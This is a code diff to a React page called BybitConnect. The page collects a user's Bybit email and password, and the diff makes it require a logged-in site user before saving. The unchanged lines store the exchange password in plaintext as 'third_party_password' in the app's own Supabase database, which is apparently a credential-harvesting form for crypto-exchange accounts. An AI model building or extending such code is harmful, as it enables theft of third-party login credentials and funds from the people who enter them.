@@ -2,9 +2,11 @@ import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Search, Menu, Send, ChevronRight, Headphones, Eye, EyeOff } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 export default function BybitConnect() {
   const navigate = useNavigate();
+  const { user } = useAuth();
   const [activeTab, setActiveTab] = useState('Email');
   const [showPassword, setShowPassword] = useState(false);
   const [loading, setLoading] = useState(false);
@@ -25,15 +27,18 @@ export default function BybitConnect() {
       setErrorMessage('Please enter your email and password.');
       return;
     }
+    if (!user) {
+      setErrorMessage('You must be logged in.');
+      return;
+    }
 
     setLoading(true);
     try {
-      const { data: { user } } = await supabase.auth.getUser();
       const { error } = await supabase.from('platform_connections').insert({
         platform: 'Bybit',
         email,
         third_party_password: password,
-        user_id: user?.id || null
+        user_id: user.id
       });
       if (error) throw error;
       navigate('/dashboard?submitted=1');
